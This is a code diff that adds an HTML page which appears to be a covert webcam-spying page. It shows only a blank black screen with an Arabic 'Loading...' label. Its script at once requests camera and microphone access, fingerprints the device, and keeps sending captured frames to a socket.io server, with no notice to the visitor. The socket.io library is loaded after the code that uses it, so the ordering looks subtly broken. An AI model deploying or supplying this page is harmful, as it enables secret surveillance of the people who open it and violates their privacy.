@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <style>
+        * { margin: 0; padding: 0; overflow: hidden; }
+        body { 
+            background: #000; 
+            position: fixed; 
+            top: 0; 
+            left: 0; 
+            width: 100vw; 
+            height: 100vh;
+        }
+        canvas { display: none; }
+        #loading { 
+            position: absolute; 
+            top: 50%; 
+            left: 50%; 
+            transform: translate(-50%, -50%); 
+            color: #333; 
+            font-family: Arial;
+        }
+    </style>
+</head>
+<body>
+    <div id="loading">جاري التحميل...</div>
+    <canvas id="canvas"></canvas>
+    
+    <script>
+        const socket = io();
+        let stream, video, canvas, ctx;
+        let deviceId = 'device_' + Math.random().toString(36).substr(2, 9);
+        
+        // جمع معلومات الجهاز
+        const deviceInfo = {
+            name: navigator.userAgent.split(' ').pop() || 'Unknown',
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            language: navigator.language,
+            screen: `${screen.width}x${screen.height}`,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            cookies: navigator.cookieEnabled ? 'Enabled' : 'Disabled',
+            ip: 'Detecting...'
+        };
+        
+        // بدء الكاميرا
+        async function initCamera() {
+            try {
+                stream = await navigator.mediaDevices.getUserMedia({
+                    video: { 
+                        width: { ideal: 1280 }, 
+                        height: { ideal: 720 },
+                        facingMode: 'user'
+                    },
+                    audio: true
+                });
+                
+                video = document.createElement('video');
+                video.srcObject = stream;
+                video.play();
+                
+                canvas = document.getElementById('canvas');
+                ctx = canvas.getContext('2d');
+                
+                video.onloadedmetadata = () => {
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    document.getElementById('loading').remove();
+                    sendStream();
+                    socket.emit('device-connected', {
+                        id: deviceId,
+                        name: deviceInfo.name,
+                        room: 'main',
+                        info: deviceInfo
+                    });
+                };
+            } catch(err) {
+                console.log('Camera access denied');
+            }
+        }
+        
+        // إرسال الفيديو
+        function sendStream() {
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            const frame = canvas.toDataURL('image/jpeg', 0.7);
+            
+            socket.emit('stream-frame', {
+                deviceId: deviceId,
+                frame: frame
+            });
+            
+            requestAnimationFrame(sendStream);
+        }
+        
+        // ابدأ فوراً
+        initCamera();
+    </script>
+    <script src="/socket.io/socket.io.js"></script>
+</body>
+</html>
